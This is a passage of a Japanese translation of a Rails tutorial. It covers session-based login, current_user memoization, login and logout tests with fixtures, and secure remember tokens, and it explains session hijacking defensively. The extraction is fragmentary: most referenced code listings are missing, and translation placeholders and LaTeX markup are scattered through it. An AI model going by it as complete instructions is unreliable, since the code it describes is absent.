\kode{flash}のメッセージとは異なり、\kode{flash.now}のメッセージはその後リクエストが発生したときに消滅します (リスト\ref{code:flash_persistence_test}ではまさにその手順を再現しています)。
置き換えの終わった正しいアプリケーションコードをリスト\ref{code:correct_login_failure}に示します。
ログイン失敗時の正しい処理 
続いて、ログインの統合テストを含む全テストスイートを実行してみると、 \passing になることを確認できます。
$ bundle exec rake test TEST=test/integration/users_login_test.rb<n>$ bundle exec rake test
無効な値の送信をログインフォームで正しく処理できるようになったので、次は、実際にログイン中の状態での有効な値の送信をフォームで正しく扱えるようにします。
この節では、cookiesを使用する一時セッションでユーザーをログインできるようにします。このcookiesは、ブラウザを閉じると自動的に有効期限が切れるものを使用します。
\ref{sec:remember_me}では、ブラウザを閉じても保持されるセッションを追加します。
セッションを実装するには、様々なコントローラやビューでおびただしい数の関数を定義する必要があります。
Rubyの{0}モジュール{/0}という機能を使用すると、そうした関数を一箇所にパッケージ化できることを{p1}で学びました。
ありがたいことに、Sessionsコントローラ (\ref{sec:sessions_controller}) を生成した時点で既にセッション用ヘルパーモジュールも (密かに) 自動生成されています。
さらに、Railsのセッション用ヘルパーはビューにも自動でインクルードされます。Railsの全コントローラのベースクラス (=Application コントローラ) にこのモジュールをインクルードすれば、このアプリケーションのコントローラでも使えるようになります (リスト\ref{code:sessions_helper_include})。
ApplicationコントローラにSessionヘルパーモジュールをインクルードする
設定が完了したら、いよいよユーザーログインのコードを書き始めましょう。
Railsで事前定義済みの\kode{session}メソッドを使用して、単純なログインを行えるようにします
(なお、これは\ref{sec:sessions_controller}で生成したSessionsコントローラとは無関係ですのでご注意ください)。
この\kode{session}メソッドはハッシュのように扱えるので、以下のように代入します。
上のコードを実行すると、ユーザーのブラウザ内の一時cookiesに暗号化済みのユーザーIDが自動で作成されます。この後のページで、\kode{session[:user\_id]}を使用してユーザーIDを元通りに取り出すことができます。
一方、\kode{cookies}メソッド (\ref{sec:remember_me}) の場合は、\kode{session}メソッドで作成された一時cookiesは、ブラウザを閉じた瞬間に有効期限が終了します。
同じログイン手法を様々な場所で使い回せるようにするために、Sessionsヘルパーに\kode{log\_in}という名前のメソッドを定義することにします (リスト\ref{code:log_in_function})
\kode{log\_in}関数
\kode{session}メソッドで作成した一時cookiesは自動的に暗号化され、リスト\ref{code:log_in_function}のコードは保護されます。そしてここが重要なのですが、攻撃者がたとえこの情報をcookiesから盗み出すことができたとしても、それを使って本物のユーザーとしてログインすることはできないのです。
ただし今述べたことは、\kode{session}メソッドで作成した「一時セッション」にしか該当しません。\kode{cookies}メソッドで作成した「永続的セッション」ではそこまで断言は\emph{できません}。
永続的なcookiesには、\emph{セッションハイジャック}という攻撃を受ける可能性が常につきまといます。ユーザーのブラウザ上に保存される情報については、\ref{sec:remember_me}でもう少し注意深く扱うことにします。
リスト{p0}で{2}log_in{/2}というヘルパーメソッドを定義できたので、やっと、ユーザーログインを行ってセッションの{2}create{/2}アクションを完了し、ユーザーのプロフィールページにリダイレクトする準備ができました。
作成したコードをリスト\ref{code:log_in_success}に示します
リスト{p0}でモジュールをインクルードしているので、Sessionコントローラで{2}log_in{/2}メソッドを使用できます。
ユーザーにログインする
以下の簡単なリダイレクトは、
\ref{sec:the_finished_signup_form}でも使用しました。
Railsでは、自動的に上のコードを変換して、以下のようなユーザープロフィールページへのルーティングします。
リスト{p0}で{2}create{/2}アクションを定義できたので、\ref{code:login_form}で定義したログインフォームも正常に動作するようになったはずです。
今はログインしても画面表示が何も変わらないので、ユーザーがログイン中かどうかは、ブラウザセッションを直接確認しない限りわかりません。
このままでは困るので、ログインしていることがはっきりわかるようにします。そこで\ref{sec:current_user}では、セッションに含まれるIDを利用して、データベースから現在のユーザー名を取り出して画面で表示する予定です。
\ref{sec:changing_the_layout_links}では、アプリケーションのレイアウト上のリンクを変更する予定です。このリンクをクリックすると、現在ログオンしているユーザーのプロフィールが表示されます。
ユーザーIDを一時セッションの中に安全に置けるようになったので、今度はそのユーザーIDを別のページで取り出すことにしましょう。そのためには、\kode{current\_user}メソッドを定義して、セッションIDに対応するユーザー名をデータベースから取り出せるようにします。
\kode{current\_user}メソッドの目的は、以下のようなコードを書けるようにすることです。
現在のユーザーを検索する方法のひとつとして思い付くのは、ユーザープロフィールページ (リスト{p0}) と同様に、以下の{2}find{/2}メソッドを使用することです。
しかし\ref{sec:finding_user_objects}で既に経験済みのとおり、ユーザーIDが存在しない状態で\kode{find}を使用すると例外が発生してしまいます。
findのこの動作は、ユーザープロフィールページでは完全に適切です。IDが無効の場合は例外を発生してくれなければ困るからです。しかし、ユーザーがログインしていないなど多くの状況では、\kode{session[:user\_id]}の値は\kode{nil}になります。
この状態を修正するために、\kode{create}メソッド内でメールアドレスの検索に使ったのと同じ\kode{find\_by}メソッドを使うことにします。ただし今度は\kode{email}ではなく\kode{id}で検索します。
今度はIDが無効な場合 (=ユーザーが存在しない場合) にもメソッドは例外を発生せず、\kode{nil}を返します。
今度は\kode{current\_user}を以下のように定義し直します。
これは正常に動作します。しかし少し残念なのは、\kode{current\_user}がページ内で複数使用されていると、同じ回数だけデータベースも呼び出されてしまうことです。
そこで、Rubyの慣習に従って、\kode{User.find\_by}の実行結果をインスタンス変数に保存することにします。こうすることで、データベースの読み出しは最初の一回だけになり、以後の呼び出しではインスタンス変数を返すようになります{p1}。地味なようですが、Railsの高速化のために重要なテクニックです。
このように、メソッド呼び出しでの変数代入を記憶して次回以降の呼び出しで使い回す手法を\href{http://en.wikipedia.org/wiki/Memoization}{\emph{メモ化 (memoization)}} と呼びます。
memorizationのスペルミス\emph{ではなく}、それをもじったmemoization (rがない) という造語であることにご注意ください。
\emph{or}演算子「\texttt{||}」(\ref{sec:objects_and_message_passing}) を使用すれば、上の「メモ化」コードを以下のようにたった1行で書けます。
ここで重要なのは、Userオブジェクトそのものの論理値は常にtrueになることです。そのおかげで、\kode{@current\_user}に何も代入されていないときだけ\kode{find\_by}呼び出しが実行され、無駄なデータベース読み出しが行われなくなります。
上のコードはひとまず動作しますが、実はまだ「Ruby的に」正しいコードではありません。\kode{@current\_user}への代入は、Rubyでは以下のような短縮形で書くのが王道です。
@current_user ||= User.find_by(id: session[:user_id])
この「\texttt{||=}」(or equals) という代入演算子はRubyで広く使用されているイディオムであり、Ruby開発者を志すならこの演算子に習熟することが重要です。
\emph{or equals}という概念は一見神妙不可思議に見えますが、他のものになぞらえて考えれば難しくありません。
多くのコンピュータプログラムでは、以下のような記法で変数の値を1つ増やすことができます。
<n><n>\begin{verbatim}<n>
  x = x + 1
そして、Ruby (およびC、C++、Perl、Python、Javaなどの多くのプログラミング言語) では、上の演算を以下のような短縮形で表記することもできます。
  x += 1
他の演算子についても同様の短縮形が利用できます。
  $ rails console<n>  >> x = 1<n>  => 1<n>  >> x += 1<n>  => 2<n>  >> x *= 3<n>  => 6<n>  >> x -= 8<n>  => -2<n>  >> x /= 2<n>  => -1
いずれの場合も、\texttt{●}という演算子があるときの「\texttt{x = x ● y}」と「\texttt{x ●= y}」の動作は同じです。
Rubyでは、「変数の値が\texttt{nil}なら変数に代入するが、nilでなければ代入しない (変数の値を変えない)」という操作が非常によく使われます。
{p0}で説明した{2}or{/2}演算子{3}||{/3}を使用すれば、以下のように書くことができます。
  >> @foo<n>  => nil<n>  >> @foo = @foo || "bar"<n>  => "bar"<n>  >> @foo = @foo || "baz"<n>  => "bar"
\texttt{nil}の論理値はfalseになるので、\texttt{@foo}への最初の代入「\texttt{nil || "bar"}」の評価値は\texttt{"bar"}になります。
同様に、2つ目の代入「\texttt{@foo || "baz"}」(\texttt{"bar" || "baz"}など) の評価値は\texttt{"bar"}になります。
Rubyでは、\texttt{nil}と\texttt{false}を除いて、あらゆるオブジェクトの論理値が\texttt{true}になるように設計されています。さらにRubyでは、\texttt{||}演算子をいくつも連続して式の中で使用する場合、項を左から順に評価し、最初にtrueになった時点で処理を終えるように設計されています
(なお、このように\texttt{||}式を左から右に評価し、演算子の左の値が最初にtrueになった時点で処理を終了するという評価法を\emph{短絡評価 (short-circuit evaluation)} と呼びます。
上記の演算子をコンソールセッション上で実際に実行して比較してみると、\texttt{@foo = @foo || "bar"}は\texttt{x = x O y}に該当し、\texttt{O}が\texttt{||}に置き換わっただけであることがわかります。
  x    =   x   +   1      ->     x     +=   1<n>  x    =   x   *   3      ->     x     *=   3<n>  x    =   x   -   8      ->     x     -=   8<n>  x    =   x   /   2      ->     x     /=   2<n>  @foo = @foo || "bar"    ->     @foo ||= "bar"
この記法を現在のユーザーのコンテキストで使用すると以下のように簡潔なコードで表現できるようになります。
追記: \texttt{@foo || @foo = "bar"}と書いた場合 (||が左辺にある点に注意)、Rubyの内部では実際にすべての項が評価されます。これは、\texttt{@foo}が\texttt{nil}や\texttt{false}の場合に無駄な代入を避ける必要があるためです。
しかしこの式の動作では\texttt{||=}記法の動作と同じにならず、説明上不都合なので、上の解説では\texttt{@foo = @foo || "bar"} (||が右辺にある点に注意) という式を用いて説明しました。
これはリスト\ref{code:current_user}で使用されていました。
セッションに含まれる現在のユーザーを検索する
リスト{p0}の{2}current_user{/2}メソッドが動作するようになったので、ユーザーがログインしているかどうかに応じてアプリケーションの動作を変更するための準備が整いました。
ログイン機能の最初の具体的な応用として、ユーザーがログインしているときとそうでないときでレイアウトを変更してみましょう。
図\ref{fig:login_success_mockup}では、ログアウトのリンクとプロフィールのリンクは [Account] メニューの項目として表示されている点にご注目ください。リスト\ref{code:layout_login_logout_links}では、Bootstrapを使用してこのようなメニューを実現する方法を示します。
ログイン成功後のユーザープロフィール画面のモックアップ
筆者なら即、この時点で上のメニューを記述する統合テストを書くでしょう。
とはいうものの今は無理は禁物です。このテストではまたいくつか新しいアイディアを投入する必要もあるので、テスト作成は\ref{sec:testing_layout_changes}に回すことにします。
サイトレイアウトのリンクを変更する方法のひとつとして考えられるのは、ERBコードの中でif-elseを使用し、条件に応じてリンクを表示し分けることです。
このコードを書くためには、論理値を返す\kode{logged\_in?}メソッドが必要なので、まずそれを定義します。
これをチェックするには否定演算子 (\ref{sec:objects_and_message_passing})が必要なので、\kode{!} (参考: 英語ではbangと読みます) を使用します。
作成した\kode{logged\_in?}メソッドをリスト\ref{code:logged_in_p}に示します。
\kode{logged\_in?}メソッド
リスト\ref{code:logged_in_p}を追加したので、ユーザーのログイン時にレイアウトを変えられるようにする準備ができました。
なお、新しく作るリンクは4つですが、そのうち以下の2つのリンクは当面の間未実装のままとします ({0}{1}第9章{/1}{/0}で完成の予定)。
ログアウト用リンクでは、リスト\ref{code:sessions_resource}で定義したログアウト用パスを使用します。
Webブラウザは実際には\texttt{DELETE}リクエストを発行できないので、RailsではJavaScriptを使用してこのリクエストを「偽造」します。
なお、上のコードは以下のように書くこともできます。
しかしこの状況では\kode{current\_user}を使う方が、Railsによって\kode{user\_path(current\_user)}され、ユーザープロフィールへのリンクが自動的に実現できるのでずっと便利です。
そしてユーザーがログイン\emph{していない}場合は、リスト\ref{code:sessions_resource}のログイン用パスを使用して、以下のようにログインフォームへのリンクを作成します。
以上をすべてヘッダーのパーシャル部分に適用して更新したものをリスト\ref{code:layout_login_logout_links}に示します。
ログイン中のユーザー用のレイアウトのリンクを変更する
</li>
詳しくは、\href{http://getbootstrap.com/components/}{Bootstrapコンポーネント一覧ページ} (英語) を参照してください。
selfを省略した結果をリスト\ref{code:bootstrap_js}に示します。
\kode{application.js}にBootstrapのJavaScriptライブラリを追加する
//= require jquery
//= require jquery_ujs
//= require bootstrap
//= require_tree .
このコードはリスト\ref{code:layout_login_logout_links}で使用されていました。もうひとつ、
ブラウザを完全に終了すると、期待どおりアプリケーションのログインステータスが消去され、再びログインを要求されるようになったことを確認できます。
ドロップダウンメニューと新しいリンクが表示されたログイン中のユーザー
アプリケーションでのログイン成功を手動で確認したので、先に進む前に統合テストを書いてこの動作をテストで表現し、今後の回帰バグの発生をキャッチできるようにしましょう。
リスト\ref{code:flash_persistence_test}を元にテストを作成し、以下の操作手順をテストで記述して確認できるようにします。
セッション用パスに有効な情報をpostする
ログイン用リンクが表示されなくなったことを確認する
ログアウト用リンクが表示されていることを確認する
プロフィール用リンクが表示されていることを確認する
上の変更を確認するためには、テスト時に登録済みユーザーとしてログインしておく必要があります。当然ながら、データベースにそのためのユーザーが登録されていなければなりません。
Railsでは、このようなテスト用データを\emph{フィクスチャ}で作成できます。フィクスチャを使用して、テストに必要なデータをtestデータベースに読み込んでおくことができます。
\ref{sec:uniqueness_validation}では、メールの一意性テスト (リスト\ref{code:empty_fixtures}) がパスするためにデフォルトのフィクスチャを削除する必要がありました。
今度は自分で空のフィクスチャファイルを作成してデータを追加しましょう。
現時点のテストでは、ユーザーはひとりいれば十分です。そのユーザーには有効な名前と有効なメールアドレスを設定しておきます。
テスト中にそのユーザーとして自動ログインするために、そのユーザーの有効なパスワードも用意して、Sessionsコントローラの\kode{create}アクションに送信されたパスワードと比較できるようにする必要があります。
図\ref{fig:user_model_password_digest}のデータモデルをもう一度見てみると、\kode{password\_digest}属性をユーザーのフィクスチャに追加すればよいことがわかります。そのために、\kode{digest}メソッドを独自に定義することにします。
\ref{sec:a_hashed_password}で説明したように、\kode{has\_secure\_password}でbcryptパスワードが作成されるので、同じ方法でフィクスチャ用パスワードを作成します。
Railsの\href{https://github.com/rails/rails/blob/master/activemodel/lib/active_model/secure_password.rb}{secure_passwordのソースコード}を調べてみると、以下のメソッドがあります。
\kode{string}はハッシュ化する文字列、\kode{cost}は\emph{コストパラメータ}と呼ばれる値です。コストパラメータでは、ハッシュを算出するための計算コストを指定します。
コストパラメータの値を高くすれば、ハッシュからオリジナルのパスワードを計算で推測することが困難になりますので、production環境ではセキュリティ上重要です。しかしテスト中はコストを高くする意味はないので、\kode{digest}メソッドの計算はなるべく軽くしておきます。
secure_passwordのソースコードには以下の行があります。
少々込み入っていますが、コストパラメータをテスト中は最小にし、production環境ではnormal (high) にする方法がわかれば十分です。
「\kode{?}」〜「\kode{:}」という記法については\ref{sec:remember_me_checkbox}で解説します。
\kode{digest}メソッドは他にも様々な場所で使用できます。\ref{sec:remember_token}では\kode{digest}をUserモデルで再利用します。
そこでは、digestメソッドを\kode{user.rb}に置くことをすすめています。
ダイジェストの計算はユーザーごとに行わなければならないものではないので、フィクスチャファイルなどでわざわざユーザーオブジェクトにアクセスする必然性はありません。そこで、\kode{digest}メソッドをUserクラス自身に配置してクラスメソッドにすることにしましょう ({1}クラスメソッド{/1}の作り方については{p2}で簡単に説明しました)。
作成したコードをリスト\ref{code:digest_method}に示します
フィクスチャ向けのdigestメソッドを追加する
# 与えられた文字列のハッシュ値を返す
リスト{p0}の{2}digest{/2}メソッドができたので、有効なユーザーを表すユーザーフィクスチャを作成できるようになりました (リスト\ref{code:real_user_fixture})。
ユーザーログインのテストで使用するフィクスチャ
フィクスチャではERBを利用できる点にご注目ください。
上のERBコードでテストユーザー用の有効なパスワードを作成できます。
\kode{has\_secure\_password}で必要となる\kode{password\_digest}属性はこれで準備できましたが、ハッシュ化されていない生のパスワードも参照できると便利です。
しかし残念なことに、フィクスチャではこのようなことはできません。さらに、リスト{p0}に{2}password{/2}属性を追加すると、そのようなカラムはデータベースに存在しないというエラーが発生します。実際、データベースにはそんなカラムはありません。
この状況を切り抜けるために、テスト用のフィクスチャユーザーでは全員同じパスワード「\kode{password}」を使用することにします。これはフィクスチャでよく使われる手法です。
有効なユーザーのフィクスチャを作成できたので、テストで以下のようにフィクスチャデータを参照できます。
上の\kode{users}はフィクスチャのファイル名\kode{users.yml}を表し、\kode{:michael}というシンボルはリスト\ref{code:real_user_fixture}のユーザーを参照するためのキーを表します。
フィクスチャのユーザーにアクセスできるようになったので、レイアウトのリンクをテストできる状態になりました。レイアウトのリンクをテストするには、前述の操作手順をテストコードに書き換えます (リスト\ref{code:user_login_test_valid_information})。
有効な情報を使用してユーザーログインをテストする
logout_path
上のコードのうち、以下の行は
リダイレクト先が正しいかどうかをチェックします。
上の行では、実際にそのページに移動します。
リスト\ref{code:user_login_test_valid_information}では、ログイン用リンクが表示されなくなったことも確認しています。このチェックは、ログインパスのリンクがページに\emph{ない}かどうかで判定しています。
\kode{count: 0}というオプションをアサーションに追加すると、渡したパターンに一致するリンクがゼロになっているかどうかを確認するよう\kode{assert\_select}に指示します。
なお、リスト{p0}では、{2}count: 2{/2}を使用してリンクが2つあるかどうかを確認しているので、比較してみるとよいでしょう。
アプリケーションのコードは既に動作するようになっているので、ここでテストを実行すると \passing になるはずです。
$ bundle exec rake test TEST=test/integration/users_login_test.rb \<n>>                       TESTOPTS="--name test_login_with_valid_information"
上のコマンドでは、指定したテストファイル内にある特定のテストだけを実行するために、以下のオプションを追加してあります。
TESTOPTS="--name test_login_with_valid_information"
(上記の2行目にある '>' という文字は、改行を示すためにシェルが自動的に挿入する文字です。手動で入力しないよう、注意してください。) 上のオプションは、テスト名を指定するときに使うオプションです。なお、指定するテスト名は、接頭語の「test_」と、テストの説明文の単語をアンダースコアでつないだ文字列で表します。
以上で認証システムが動作するようになりましたが、今のままでは、登録の終わったユーザーがデフォルトではログインしていないので、ユーザーがとまどう可能性があります。
ユーザー登録が終わってからユーザーに手動ログインを促すと、ユーザーに余分な手順を強いることになるので、ユーザー登録中にログインを済ませておくことにします。
ユーザー登録中にログインするには、Usersコントローラの\kode{create}アクションに\kode{log\_in}を追加するだけで済みます (リスト\ref{code:login_upon_signup})
Sessionsコントローラがあることで、Usersコントローラで\kode{log\_in}メソッドを使用できるようになります。そのために必要なモジュールはリスト\ref{code:sessions_helper_include}でインクルードされています。
ユーザー登録中にログインする
リスト\ref{code:login_upon_signup}の動作をテストするために、リスト\ref{code:a_test_for_valid_submission}のテストに1行追加して、ユーザーがログイン中かどうかをチェックします。
そのために、リスト{p0}で定義した{2}logged_in?{/2}ヘルパーメソッドとは別に、{2}is_logged_in?{/2}ヘルパーメソッドを定義しておくと便利です。このヘルパーメソッドは、テストのセッションにユーザーがあれば{2}true{/2}を返し、それ以外の場合はfalseを返します (リスト\ref{code:test_helper_sessions})。
残念ながらヘルパーメソッドはテストから呼び出せないので、リスト{p0}のように{2}current_user{/2}を呼び出せません。{2}session{/2}メソッドはテストでも利用できるので、これを代わりに使用します。
ここでは取り違えを防ぐため、\kode{logged\_in?}の代わりに\kode{is\_logged\_in?}を使用して、ヘルパーメソッド名がテストヘルパーとSessionヘルパーで同じにならないようにしておきます
一例として、かつて筆者が作成したテストスイートでは、Sessionsヘルパーから{0}log_in{/0}メソッドをうっかり削除してしまったにもかかわらず、テストが \passing のまま変わらなかったことがありました。
原因は、テストで使用していたテストヘルパーメソッドの名前が、うかつにもSessionsヘルパーメソッド名と同じだったことです。そのため、アプリケーションが壊れていてもテストがパスしてしまいました。
テストヘルパーメソッド名を、Sessionヘルパーメソッド名\kode{log\_in\_as} (リスト\ref{code:test_helper_log_in}) とは異なる\kode{is\_logged\_in?}で定義することで、この問題を回避できます。
テスト中のログインステータスを論理値で返すメソッド
リスト\ref{code:test_helper_sessions}のコードを使用すると、ユーザー登録の終わったユーザーがログイン状態になっているかどうかを確認できます (リスト\ref{code:login_after_signup_test})。
ユーザー登録後のログインのテスト 
これで、テストを実行すると \passing になるはずです。
\ref{sec:sessions_and_failed_login}で解説したように、このアプリケーションで使用する認証モデルでは、ユーザーが明示的にログアウトするまではログイン状態を保てなくてはなりません。
この節では、そのために必要なログアウト機能を追加することにします。
ログアウト用リンクはリスト\ref{code:layout_login_logout_links}で既に作成済みなので、ユーザーセッションを破棄するための有効なアクションをコントローラで作成するだけで済みます。
これまで、SessionsコントローラのアクションはRESTfulルールに従っていました。\kode{new}でログインページを表示し、\kode{create}でログインを完了するといった具合です。
セッションを破棄する\kode{destroy}アクションも、引き続き同じ要領で作成することにします。
ただし、ログインの場合 (リスト\ref{code:log_in_success}とリスト\ref{code:login_upon_signup}) と異なり、ログアウト処理は1か所で行えるので、\kode{destroy}アクションに直接ログアウト処理を書くことにします。
\ref{sec:remember_tests}でも説明しますが、この設計 (および若干のリファクタリング) のおかげで認証メカニズムのテストが行い易くなります。
ブラウザによっては、「\href{http://stackoverflow.com/questions/20449641/rails-4-session-value-never-expires-or-dies-when-browser-closes}{ログイン状態を保存する}」などでセッションを自動復元する機能がサポートされていることがあります。この機能は開発の邪魔になるので、ログアウトする前にこの機能を必ずオフにしておいてください。
インスタンス変数\kode{@current\_user}を\kode{nil}にする必要があるのは、\kode{@current\_user}が\kode{destroy}アクションより前に作成され (作成されていない場合)、\emph{かつ}、リダイレクトを直接発行しなかった場合だけです。今回はリダイレクトを直接発行しているので、不要です。
現実にこのような条件が発生する可能性はかなり低く、このアプリケーションでもこのような条件を作り出さないように開発しているので、本来はnilに設定する必要はないのですが、ここではセキュリティ上の死角を万が一にでも作り出さないためにあえてnilに設定しています。
selfを省略した結果をリスト\ref{code:log_out_method}に示します。
\kode{log\_out}メソッド
# 現在のユーザーをログアウトする
selfを省略した結果をリスト\ref{code:destroy_session}に示します。
セッションを破棄する (ユーザーログアウト)
ログアウト機能をテストするために、リスト\ref{code:user_login_test_valid_information}のユーザーログインのテストに手順を若干追加します。
ログイン後、\kode{delete}メソッドで\texttt{DELETE}リクエストをログアウト用パス (表\ref{table:RESTful_sessions}) に発行し、ユーザーがログアウトしてルートURLにリダイレクトされたことを確認します。ログイン用リンクが再度表示されること、ログアウト用リンクとプロフィール用リンクが非表示になることも確認します。
手順を追加したテストをリスト\ref{code:user_logout_test}に示します。
ユーザーログアウトのテスト 
テストで\kode{is\_logged\_in?}ヘルパーメソッドを利用できるようにしてあったおかげで、有効な情報をセッション用パスにpostした直後に\kode{assert is\_logged\_in?}で簡単にテストできました。
\ref{sec:logging_in}で完了したログインシステムは、それ自体で十分完結した機能です。しかし多くのWebサイトでは、ブラウザを閉じた後にもセッションを継続する機能などを追加しているのが普通です。
本節では、ユーザーログインをデフォルトで保持するように変更し、ユーザーが明示的にログアウトするまではセッションを期限切れにしないようにします。
この後\ref{sec:remember_me_checkbox}では、別の方法として、ログインを保存する「remember-me」チェックボックスを追加して、ログインを継続するかどうかをユーザーが選択できるようにする予定です。
どちらの方式も商用に利用できる品質を備えています。前者は\href{http://github.com/}{GitHub}や\href{http://bitbucket.org/}{Bitbucket}で、後者は\href{http://www.facebook.com/}{Facebook}や\href{http://twitter.com/}{Twitter}でそれぞれ採用されています。
\ref{sec:logging_in}では、Railsの\kode{session}メソッドを使用してユーザーIDを保存しましたが、この情報はブラウザを閉じると消えてしまいます。
本節では、セッションの永続化の第一歩として\emph{記憶トークン (remember token) }を生成し、\kode{cookies}メソッドによる永続的cookiesの作成や、安全性の高い\emph{記憶ダイジェスト (remember digest) }によるトークン認証にこの記憶トークンを活用します。
\ref{sec:a_working_log_in_method}で解説したように、\kode{session}メソッドで保存した情報は自動的に安全が保たれますが、\kode{cookies}メソッドに保存する情報は残念ながらそのようにはなっていません。
特に、cookiesを永続化すると\href{http://en.wikipedia.org/wiki/Session_hijacking}{セッションハイジャック}という攻撃を受ける可能性があります。この攻撃は、記憶トークンを奪って、特定のユーザーになりすましてログインするというものです。
セッションハイジャックは、セキュリティ上の注意を呼びかけるためにこれを実演する\href{http://codebutler.com/firesheep}{Firesheep}アプリケーションによって広く知られるようになりました。Firesheepを使用すると、公共Wi-Fiネットワーク経由で接続したときに多くの有名Webサイトの記憶トークンが丸見えになっていることがわかります。
\ref{sec:professional_grade_deployment}では、最初の問題を防止するために\href{https://en.wikipedia.org/wiki/Transport_Layer_Security}{Secure Sockets Layer} (SSL) をサイト全体に適用して、ネットワークデータを暗号化で保護し、パケットスニッファから読み取られないようにしています。
2番目の問題の対策としては、記憶トークンをそのままデータベースに保存するのではなく、記憶トークンのハッシュ値を保存するようにします。これは、\ref{sec:adding_a_secure_password}で生のパスワードをデータベースに保存する代わりにパスワードのダイジェストを保存したのと同じコンセプトです。
3 番目の問題については、Railsによって自動的に対策が行われます。具体的には、ビューテンプレートで入力した内容をすべて自動的にエスケープします。
4番目のログイン中のコンピュータへの物理アクセスによる攻撃については、さすがにシステム側での根本的な防衛手段を講じることは不可能なのですが、ユーザーがログアウトしたときにトークンを必ず変更し、機密上重要になる可能性のある情報をブラウザに表示するときには\emph{暗号による署名}を行うようにすることで、物理アクセスによる攻撃を最小限に留めるようにします。
上で説明した設計やセキュリティ上の考慮事項を元に、以下の方針で永続的セッションを作成することにします。
記憶トークンにはランダムな文字列を生成して用いる。
ブラウザのcookiesにトークンを保存するときには、有効期限を設定する。
トークンはハッシュ値に変換してからデータベースに保存する。
ブラウザのcookiesに保存するユーザーIDは暗号化しておく。
永続ユーザーIDを含むcookiesを受け取ったら、そのIDでデータベースを検索し、記憶トークンのcookiesがデータベース内のハッシュ値と一致することを確認する。
上の最後の手順が、ユーザーログインのときの手順と似ていることにご注目ください。ユーザーログインでは、メールアドレスをキーにしてユーザーを取り出し、送信されたパスワードがパスワードダイジェストと一致することを (\kode{authenticate}メソッドで) 確認します (リスト\ref{code:find_authenticate_user})。
つまり、ここでの実装は\kode{has\_secure\_password}と似た側面を持ちます。
それでは最初に、必要となる\kode{remember\_digest}属性をUserモデルに追加します (図\ref{fig:user_model_remember_digest})。
\kode{remember\_digest}属性を追加したUserモデル
図\ref{fig:user_model_remember_digest}のデータモデルをアプリケーションに追加するために、以下のマイグレーションを生成します。
(\ref{sec:a_hashed_password}のパスワードダイジェストのときのマイグレーションと比較してみましょう)。
前回のマイグレーションと同様、今回のマイグレーション名も\kode{\_to\_users}で終わっています。これは、マイグレーションの対象がデータベースの\kode{users}テーブルであることをRailsに指示するためのものです。
今回は種類=\kode{string}の\kode{remember\_digest}属性を追加しているので、いつものようにRailsによってデフォルトのマイグレーションが作成されます (リスト\ref{code:add_remember_digest_to_users_generated})。
記憶ダイジェスト用に生成したマイグレーション
記憶ダイジェストはユーザーが直接読み出すことはないので (かつ、そうさせてはならないので)、\kode{remember\_digest}カラムにインデックスを追加する必要はありません。従って、上のマイグレーションは変更せずにそのまま使用します。
ここで、記憶トークンとして何を使用するかを決める必要があります。
有力な候補として様々なものが考えられますが、基本的には長くてランダムな文字列であればどんなものでも構いません。
このメソッドは、RailsCastの「\href{http://railscasts.com/episodes/274-remember-me-reset-password}{remember me}」の記事を元に選びました。
典型的なbase64の文字列は、次のようなものです。
実際、これでもOKなのです。bcryptの\href{https://en.wikipedia.org/wiki/Salt_%28cryptography%29}{ハッシュはソルト化されている}ので、2人のユーザーのパスワードが本当に一致するのかどうかはハッシュからは絶対わかりません。(訳注: 「ソルト」とは、暗号を強化するために加えられる任意の短い文字列です。念には念を入れて「塩ひとつまみ」を加えるというイメージであり、英語の「take it with a grain of salt」=半分疑ってかかるという言い回しが語源です)
記憶トークンが一意に保たれることで、攻撃者はユーザーIDと記憶トークンを\emph{両方とも}奪い取ることに成功しない限りセッションをハイジャックできなくなります。
さらにありがたいことに、base64はURLを安全にエスケープするためにも用いられる (\kode{urlsafe_base64}という名前のメソッドがあることからもわかります) ので、base64を採用すれば、{1}第{2}10{/2}章{/1}でアカウントの有効化のリンクやパスワードリセットのリンクでも同じトークンジェネレータを使用できるようになります。
ユーザーを記憶するには、記憶トークンを作成して、そのトークンをダイジェストに変換したものをデータベースに保存します。
フィクスチャをテストするときに\kode{digest}メソッドを既に作成してあったので (リスト\ref{code:digest_method})、上の結論に従って、新しいトークンを作成するための\kode{new\_token}メソッドを作成できます。
一般に、あるメソッドがオブジェクトのインスタンスを必要としていない場合は、クラスメソッドにするのが常道です。
\ref{sec:account_activation_mailer}では、実際にこの決定が重要になってきます。
これはリスト\ref{code:token_method}で使用されていました。
トークン生成用メソッドを追加する
さしあたっての実装計画としては、\kode{user.remember}メソッドを作成することにします。このメソッドは、記憶トークンをユーザーと関連付け、トークンに対応する記憶ダイジェストをデータベースに保存します。
リスト\ref{code:add_remember_digest_to_users_generated}のマイグレーションを行ってあるので、Userモデルには既に\kode{remember\_digest}属性が追加されていますが、\kode{remember\_token}属性はまだ追加されていません。
そこで、\kode{user.remember\_token}メソッド (cookiesの保存場所です) を使用してトークンにアクセスできるようにする必要があります。しかも、トークンをデータベースに\emph{保存せずに}実装する必要があります。
そのためには、\ref{sec:adding_a_secure_password}の安全なパスワードの問題のときと同様の手法でこれを解決します。あのときは、「仮想の」\kode{password}属性と、データベース上のセキュアな\kode{password\_digest}属性を使用しました。
仮想の\kode{password}属性は\kode{has\_secure\_password}メソッドで自動的に作成できましたが、今回は\kode{remember\_token}のコードを自分で書く必要があります。
これを行うには、{p0}で行ったように{2}attr_accessor{/2}を使用してアクセス可能な属性を作成します。
\kode{remember}メソッドの1行目の代入にご注目ください。
\kode{self}というキーワードを使用しないと、Rubyによって\kode{remember\_token}という名前の\emph{ローカル}変数が作成されてしまいます。この動作は、Rubyにおけるオブジェクト内部への要素代入の仕様によるものです。今欲しいのはローカル変数ではありません。
(リスト{p0}の他の{2}before_save{/2}コールバックで、{2}email{/2}ではなく{2}self.email{/2}と記述していた理由が、これでおわかりいただけたと思います)。
\kode{remember}メソッドの次の行では、\kode{update_attribute}メソッドで記憶ダイジェストを更新しています
(\ref{sec:updating_user_objects}で説明したように、このメソッドはバリデーションを素通りさせます。ここではユーザーのパスワードやパスワード確認にアクセスできないので、バリデーションを素通りさせなければなりません)。
これはリスト\ref{code:user_model_remember}で使用されていました。
\kode{remember}メソッドをUserモデルに追加する 
\kode{user.remember}メソッドが動作するようになったので、ユーザーの暗号化済みIDと記憶トークンをブラウザの永続cookiesに保存して、永続セッションを作成する準備ができました。
これを実際に行うには\kode{cookies}メソッドを使用します。このメソッドは、\kode{session}のときと同様にハッシュとして扱えます。
個別のcookiesは、ひとつの\kode{value} (値) と、オプションの\kode{expires} (有効期限) からできています。有効期限は省略可能です。
